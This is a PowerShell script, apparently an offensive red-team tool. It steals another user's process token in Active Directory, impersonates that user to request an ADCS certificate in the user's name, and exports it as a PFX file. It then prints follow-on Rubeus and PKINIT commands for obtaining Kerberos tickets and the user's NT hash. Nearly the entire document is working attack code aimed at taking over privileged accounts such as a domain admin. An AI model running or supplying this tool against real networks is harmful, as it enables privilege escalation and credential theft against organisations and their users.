<#
.SYNOPSIS
    This PowerShell script performs impersonation to request a certificate for a given user using Active Directory Certificate Services (ADCS).

.DESCRIPTION
    The script uses Windows API functions to obtain a token for a specified user process, impersonates that user, and then request a certificate. 
    The script generates a random password for the certificate.

.PARAMETER Username
    The username of the target user in DOMAIN\User format.

.PARAMETER CA
    The configuration string for the Certificate Authority (CA) including the CA server name and CA name in ADCS.Server\CA-Name format.

.PARAMETER Template
    The name of the certificate template to be used for the certificate request.

.NOTES
    Invoke-CertImpersonate -Username <DOMAIN>\<Username> -CA <ADCS Server>\<CA> -Template <Template>"
    Invoke-CertImpersonate -Username CICADA\DomainAdmin -CA CA.cicada8.local\CICADA-ADCS-CA -Template User"
    
#>

param (
    [string]$Username,
    [string]$CA,
    [string]$template
)

# Define necessary Windows API functions
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
    public const uint TOKEN_ADJUST_SESSIONID = 0x0100;

    public enum SECURITY_IMPERSONATION_LEVEL {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    public enum TOKEN_TYPE {
        TokenPrimary = 1,
        TokenImpersonation
    }
}
"@

# Function to get a token for a given process ID
function Get-Token {
    param(
        [Parameter(Mandatory = $true)]
        [int]$ProcId
    )
    
    $processHandle = [Win32]::OpenProcess([Win32]::PROCESS_QUERY_INFORMATION, $false, $ProcId)
    if ($processHandle -eq [IntPtr]::Zero) {
        $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[-] Error in OpenProcess() $($errorCode)"
        return [IntPtr]::Zero
    }

    $tokenHandle = [IntPtr]::Zero
    $duplicatedTokenHandle = [IntPtr]::Zero
    $tokenAccess = [Win32]::TOKEN_DUPLICATE -bor [Win32]::TOKEN_IMPERSONATE -bor [Win32]::TOKEN_QUERY

    if ([Win32]::OpenProcessToken($processHandle, $tokenAccess, [ref]$tokenHandle)) {
        if ([Win32]::DuplicateTokenEx($tokenHandle, 0x000F01FF, [IntPtr]::Zero, [Win32+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [Win32+TOKEN_TYPE]::TokenPrimary, [ref]$duplicatedTokenHandle)) {
            Write-Host "[+] Successfully obtained token from process ID $($ProcId)"
        } else {
            $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Host "[-] Error in DuplicateTokenEx $($errorCode)"
            $duplicatedTokenHandle = [IntPtr]::Zero
        }
        [Win32]::CloseHandle($tokenHandle) | Out-Null
    } else {
        $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[-] Error in OpenProcessToken $($errorCode)"
    }

    [Win32]::CloseHandle($processHandle) | Out-Null
    return $duplicatedTokenHandle
}

# Function to get tokens for a specified user or all users
function Get-UserTokens {
    param (
        [string]$Username = ""
    )

    $tokens = @()
    $processes = Get-CimInstance Win32_Process

    if ([string]::IsNullOrEmpty($Username)) {
        Write-Host "[+] Gathering tokens for all users"
    } else {
        Write-Host "[+] Gathering tokens for user: $Username"
    }

    foreach ($process in $processes) {
        $processOwnerObject = Invoke-CimMethod -InputObject $process -MethodName GetOwner
        if ([string]::IsNullOrEmpty($processOwnerObject.User)) {
            continue
        }
        $processOwnerName = "$($processOwnerObject.Domain)\$($processOwnerObject.User)"
        
        if ([string]::IsNullOrEmpty($Username) -or $processOwnerName -eq $Username) {
            Write-Host "[DEBUG] Process PID: $($process.ProcessId), Owner: $($processOwnerName)"
            $token = Get-Token -ProcId $process.ProcessId
            if ($token -ne [IntPtr]::Zero) {
                $tokens += $token
                break  # Stop after the first successful token is obtained
            } else {
                Write-Host "[-] Failed to get token for PID $($process.ProcessId)."
            }
        }
    }

    if ($tokens.Count -eq 0) {
        throw "[-] No tokens found for user $Username."
    }
    return $tokens
}

# Function to get the distinguished name (DN) of a user
function Get-UserDN {
    param (
        [Parameter(Mandatory = $true)]
        [string]$username
    )

    # Create a new DirectorySearcher object
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(sAMAccountName=$username))"
    
    # Set the properties to load (DN)
    $searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null

    # Perform the search
    $result = $searcher.FindOne()
    
    if ($result -ne $null) {
        return $result.Properties["distinguishedname"][0]
    }
    else {
        Write-Host "User not found"
        return $null
    }
}

# Function to generate a random password
function Generate-RandomPassword {
    param (
        [int]$length = 12
    )

    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@%^*()_+-=>?"
    $password = -join ((0..($length - 1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $password
}

# Impersonation function
function Invoke-CertImpersonate {
    param (
        [string]$Username,
        [string]$CA,
        [string]$template
    )

    try {
        $tokens = Get-UserTokens -Username $Username
        if ($tokens.Count -gt 0) {
            $token = $tokens[0]
            
            # Get FQDN of current domain
            $domain = $env:USERDNSDOMAIN
            $userDN = Get-UserDN -username $Username.Split('\')[-1]

            if ($userDN -ne $null) {
                $upn = "$($Username.Split('\')[-1])@$domain"

                # Generate a random password
                $certPassword = Generate-RandomPassword -length 16

                # Define the content for request.inf
                $requestInfContent = @"
[NewRequest]
Subject="$userDN"
Exportable=TRUE
KeySpec=1
KeyUsage=0xf0
[RequestAttributes]
CertificateTemplate=$template
[Extensions] 
2.5.29.17 = "{text}UPN=$upn"
"@
                $requestInfContent | Out-File -FilePath 'C:\Windows\Tasks\request.inf' -Encoding ASCII -Force
                $certRequestPath = "C:\Windows\tasks\request.req"
                $certResponsePath = "C:\Windows\tasks\response.cer"
                $pfxPath = "C:\Windows\tasks\youlovelycert.pfx"

                $commands = @(
                    "certreq -new `"C:\Windows\Tasks\request.inf`" `"$certRequestPath`";",
                    "certreq -submit -config `"$CA`" `"$certRequestPath`" `"$certResponsePath`";",
                    "certreq -accept `"$certResponsePath`";",
                    # Get the thumbprint
                    '$thumbprint = (Get-ChildItem -Path Cert:\CurrentUser\My | Select-Object -First 1).Thumbprint',
                    # Get the certificate
                    '$cert = Get-Item -LiteralPath "Cert:\CurrentUser\My\$thumbprint";',
                    # Export Certificate
                    "Export-PfxCertificate -Cert `$cert` -Password (ConvertTo-SecureString -String `"$certPassword`" -AsPlainText -Force) -FilePath `"$pfxPath`" -Force;"
                )

                $si = New-Object Win32+STARTUPINFO
                $pi = New-Object Win32+PROCESS_INFORMATION

                # Combine commands into a single string with semicolon separators
                $commandsString = $commands -join "; "

                # Execute commands as the impersonated user
                if ([Win32]::CreateProcessWithTokenW($token, 0, "C:\Windows\System32\cmd.exe", "/c powershell `"$commandsString`"", 0, [IntPtr]::Zero, [System.IO.Directory]::GetCurrentDirectory(), [ref]$si, [ref]$pi)) {
                    Write-Host "[+] Successfully created process as user: $Username"
                    Write-Host "[+] Successfully exported certificate in $pfxPath with password ""$certPassword"""
                    Write-Host "[+] You can now run Rubeus with the following syntax:"
                    Write-Host ""
                    Write-Host "Rubeus.exe asktgt /getcredentials /user:user /certificate:`"$pfxPath`" /password:`"$certPassword`" /domain:`"$domain`" /dc:`"DC IP`" /show"
                    Write-Host ""
                    Write-Host "or dump PFX file on your linux machine"
                    Write-Host ""
                    Write-Host "gettgtpkinit.py `"$domain`"/`"$Username`" -cert-pfx `"$pfxPath`" -pfx-pass `"$certPassword`" `"$Username`".ccache"
                    Write-Host "KRB5CCNAME=`"$($Username.Split('\')[-1])`".ccache  python3 getnthash.py `"$domain`"/`"$($Username.Split('\')[-1])`" -key `"key from previous step`""
                    Write-Host ""
                } else {
                    $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    Write-Host "[-] Error in CreateProcessWithTokenW $($errorCode)"
                }

                # Clean up handles
                [Win32]::CloseHandle($pi.hProcess) | Out-Null
                [Win32]::CloseHandle($pi.hThread) | Out-Null
                [Win32]::CloseHandle($token) | Out-Null
            }
        } else {
            Write-Host "[-] No tokens found for user: $Username"
        }
    } catch {
        Write-Host "[-] Exception: $_"
    }
}

# Check if the script is being run with parameters
if ($PSBoundParameters.ContainsKey("Username")) {
    # Example usage
    Invoke-CertImpersonate -Username $Username -CA $CA -Template $template
} else {

}
